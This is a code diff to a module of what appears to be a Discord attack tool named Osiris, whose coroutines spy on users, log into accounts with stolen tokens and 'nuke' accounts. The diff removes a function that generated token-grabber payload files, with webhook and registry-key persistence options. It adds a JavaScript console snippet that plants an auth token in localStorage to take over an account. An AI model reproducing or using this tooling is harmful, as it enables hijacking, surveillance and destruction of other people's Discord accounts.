@@ -2,7 +2,6 @@
 osiris_coroutines.py
 
 This namespace contains coroutines for the Osiris thread to run.
-- generate_payload: Generates a token grabber payload.
 - spy: Gathers information about a Discord user.
 - login: Logs into a Discord account.
 - nuke: Nukes a Discord account.
@@ -29,29 +28,10 @@ from webdriver_manager.microsoft import EdgeChromiumDriverManager
 import shared.utils.utils_log as lu
 import shared.utils.utils_io as iou
 from shared.dr.dr_types import ED_BillingSourceTypes, EO_Commands_FriendlyNames, EO_Browsers
-from osiris.osiris_payload import get_payload_code
 
 API_BASE = 'https://discord.com/api/v10'
 AUTH_FAIL = 'The user authentication token provided is invalid or has expired.'
 
-
-async def generate_payload(thread, **kwargs):
-    thread.signal_generate_payload_running.emit(True)
-    __add_to_running_commands_view(thread, EO_Commands_FriendlyNames.GENERATE_PAYLOAD.value)
-
-    webhook = kwargs.get('webhook', None)
-    folder = kwargs.get('folder', None)
-    rpayload = kwargs.get('rpayload', None)
-    hpayload = kwargs.get('hpayload', None)
-    do_reg_key = kwargs.get('do_reg_key', False)
-
-    thread.signal_append_oterminal.emit('Generating payload. . .')
-    payload_code = get_payload_code(webhook, folder, hpayload, do_reg_key)
-    iou.mkfile(os.path.join('payloads', f'{rpayload}.pyw'), payload_code)
-
-    thread.signal_append_oterminal.emit(f'Payload generated successfully at payloads/{rpayload}.pyw')
-    __remove_from_running_commands_view(thread, EO_Commands_FriendlyNames.GENERATE_PAYLOAD.value)
-    thread.signal_generate_payload_running.emit(False)
 
 async def spy(thread, **kwargs):
     thread.signal_spy_running.emit(True)
@@ -206,12 +186,13 @@ async def login(thread, **kwargs):
     auth_token = kwargs.get('auth_token', None)
     if __check_auth_token(thread, auth_token) is None:
         __remove_from_running_commands_view(thread, EO_Commands_FriendlyNames.LOGIN.value)
-        thread.signal_spy_running.emit(False)
+        thread.signal_login_running.emit(False)
         return
     
     browser = kwargs.get('browser', None)
     if browser is None:
-        thread.signal_append_oterminal.emit('No compatible browser specified.')
+        thread.signal_append_oterminal.emit('If you\'re having trouble logging in automatically, or your browser is not supported, you can log in manually by pasting the following script into the developer console on the Discord login page:\n\n\
+function login() { setInterval(() => { document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = ' + f'`"{auth_token}"`' + ' }, 50); setTimeout(() => { location.reload(); }, 2500); } login();\n\nPaste the script, then hit RETURN!')
         __remove_from_running_commands_view(thread, EO_Commands_FriendlyNames.LOGIN.value)
         thread.signal_login_running.emit(False)
         return
